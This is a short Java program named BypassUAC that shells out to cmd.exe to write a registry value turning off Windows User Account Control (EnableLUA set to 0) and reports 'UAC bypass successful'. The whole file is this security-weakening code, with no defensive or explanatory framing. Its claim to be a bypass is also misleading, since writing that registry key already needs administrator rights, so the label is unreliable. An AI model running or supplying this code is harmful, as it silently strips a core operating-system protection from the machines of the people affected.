import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class BypassUAC {

    public static void main(String[] args) {
        try {
            // Create a list to store the command and its arguments
List<String> command = new ArrayList<>();
            command.add("cmd.exe");
            command.add("/c");
            command.add("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");

            // Execute the command to disable UAC
ProcessBuilder processBuilder = new ProcessBuilder(command);
            Process process = processBuilder.start();
            int exitCode = process.waitFor();

            if (exitCode == 0) {
                System.out.println("UAC bypass successful.");
            } else {
                System.err.println("UAC bypass failed with exit code " + exitCode);
            }
        } catch (IOException | InterruptedException e) {
            System.err.println("Error bypassing UAC: " + e.getMessage());
        }
    }
}
